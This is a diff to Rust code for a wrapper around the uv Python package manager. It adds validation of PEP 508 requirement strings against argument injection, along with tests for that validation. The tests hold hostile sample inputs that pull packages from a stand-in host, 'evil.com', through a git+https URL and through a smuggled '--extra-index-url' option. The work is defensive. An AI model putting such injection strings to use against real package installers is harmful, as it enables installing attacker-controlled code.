@@ -16,6 +16,45 @@ pub enum UvError {
     Io(#[from] std::io::Error),
 }
 
+/// Validate a PEP 508 requirement string to prevent injection.
+///
+/// Rejects:
+/// - Flags (starting with `-`)
+/// - URL schemes (`http://`, `https://`, `git+`, `ftp://`, etc.)
+/// - Whitespace/control characters
+/// - Embedded pip options after `;`
+fn validate_requirement(req: &str) -> Result<(), UvError> {
+    if req.starts_with('-') {
+        return Err(UvError::CommandFailed(
+            format!("Invalid requirement (starts with '-'): {}", req)
+        ));
+    }
+    if req.contains(|c: char| c.is_control() || c == ' ' || c == '\t') {
+        return Err(UvError::CommandFailed(
+            format!("Invalid requirement (contains whitespace/control chars): {:?}", req)
+        ));
+    }
+    // Reject URL-based requirements (package @ git+https://..., direct URLs)
+    let lower = req.to_ascii_lowercase();
+    let url_schemes = ["http://", "https://", "git+", "ftp://", "file://"];
+    if url_schemes.iter().any(|s| lower.contains(s)) {
+        return Err(UvError::CommandFailed(
+            format!("Invalid requirement (URL scheme not allowed): {}", req)
+        ));
+    }
+    // Reject embedded pip options after semicolon
+    if let Some(idx) = req.find(';') {
+        let after = &req[idx + 1..];
+        // Allow environment markers (e.g. ; python_version >= "3.8") but reject flags
+        if after.split(',').any(|part| part.trim().starts_with('-')) {
+            return Err(UvError::CommandFailed(
+                format!("Invalid requirement (embedded option after ';'): {}", req)
+            ));
+        }
+    }
+    Ok(())
+}
+
 /// Bridges to the `uv` Python package manager via subprocess calls.
 #[derive(Debug)]
 pub struct UvBridge {
@@ -114,11 +153,7 @@ impl UvBridge {
             .arg(venv_python);
 
         for req in requirements {
-            if req.starts_with('-') {
-                return Err(UvError::CommandFailed(
-                    format!("Invalid requirement (starts with '-'): {}", req)
-                ));
-            }
+            validate_requirement(req)?;
             cmd.arg(req);
         }
 
@@ -311,6 +346,60 @@ mod tests {
         assert!(
             err_msg.contains("Invalid requirement"),
             "Expected validation error, got: {err_msg}"
+        );
+    }
+
+    #[tokio::test]
+    async fn pip_install_rejects_url_requirement() {
+        let bridge = UvBridge::new().with_path("/nonexistent/uv");
+        let dir = tempfile::tempdir().unwrap();
+        let python = dir.path().join("python");
+
+        // No whitespace so it passes whitespace check, but contains git+ URL
+        let result = bridge
+            .pip_install(&python, &["pkg@git+https://evil.com/repo"])
+            .await;
+        assert!(result.is_err());
+        let err_msg = result.unwrap_err().to_string();
+        assert!(
+            err_msg.contains("URL scheme"),
+            "Expected URL rejection, got: {err_msg}"
+        );
+    }
+
+    #[tokio::test]
+    async fn pip_install_rejects_whitespace_requirement() {
+        let bridge = UvBridge::new().with_path("/nonexistent/uv");
+        let dir = tempfile::tempdir().unwrap();
+        let python = dir.path().join("python");
+
+        let result = bridge
+            .pip_install(&python, &["requests >= 1.0 --extra-index-url https://evil.com"])
+            .await;
+        assert!(result.is_err());
+        let err_msg = result.unwrap_err().to_string();
+        assert!(
+            err_msg.contains("whitespace"),
+            "Expected whitespace rejection, got: {err_msg}"
+        );
+    }
+
+    #[tokio::test]
+    async fn pip_install_accepts_valid_pep508() {
+        // These should pass validation (though pip install itself will fail
+        // since the uv binary doesn't exist).
+        let bridge = UvBridge::new().with_path("/nonexistent/uv");
+        let dir = tempfile::tempdir().unwrap();
+        let python = dir.path().join("python");
+
+        // Valid requirements should not be rejected by our validation
+        let result = bridge.pip_install(&python, &["requests>=2.0"]).await;
+        // Will fail because uv doesn't exist, but NOT because of validation
+        assert!(result.is_err());
+        let err_msg = result.unwrap_err().to_string();
+        assert!(
+            !err_msg.contains("Invalid requirement"),
+            "Valid PEP 508 should pass validation, got: {err_msg}"
         );
     }
 }
